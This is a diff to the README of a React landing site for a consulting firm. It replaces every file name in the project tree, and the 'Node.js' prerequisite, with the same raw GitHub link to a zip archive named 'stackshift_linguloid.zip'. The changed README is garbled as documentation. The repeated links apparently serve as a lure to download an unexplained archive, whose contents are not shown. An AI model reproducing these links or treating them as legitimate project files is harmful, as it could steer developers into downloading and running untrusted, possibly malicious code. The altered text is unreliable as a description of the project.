@@ -16,26 +16,26 @@ A modern, responsive landing website for StackShift Consulting, a digital transf
 ```
 stackshift-consulting/
 ├── public/
-│   └── index.html          # Main HTML file with Tailwind CDN
+│   └── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip          # Main HTML file with Tailwind CDN
 ├── src/
 │   ├── components/         # React components
-│   │   ├── Hero.jsx       # Hero section with CTA
-│   │   ├── Services.jsx   # Services showcase
-│   │   ├── Monetization.jsx # Pricing and business models
-│   │   ├── Clients.jsx    # Target client segments
-│   │   ├── WhyUs.jsx      # Company differentiators
-│   │   └── Footer.jsx     # Contact and social links
-│   ├── App.jsx            # Main app component
-│   └── index.js           # React entry point
-├── package.json           # Dependencies and scripts
-└── README.md             # This file
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip       # Hero section with CTA
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip   # Services showcase
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip # Pricing and business models
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip    # Target client segments
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip      # Company differentiators
+│   │   └── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip     # Contact and social links
+│   ├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip            # Main app component
+│   └── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip           # React entry point
+├── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip           # Dependencies and scripts
+└── https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip             # This file
 ```
 
 ## 🚀 Getting Started
 
 ### Prerequisites
 
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/MEDDKFMF/stackshift/main/public/stackshift_linguloid.zip (version 14 or higher)
 - npm or yarn
 
 ### Installation
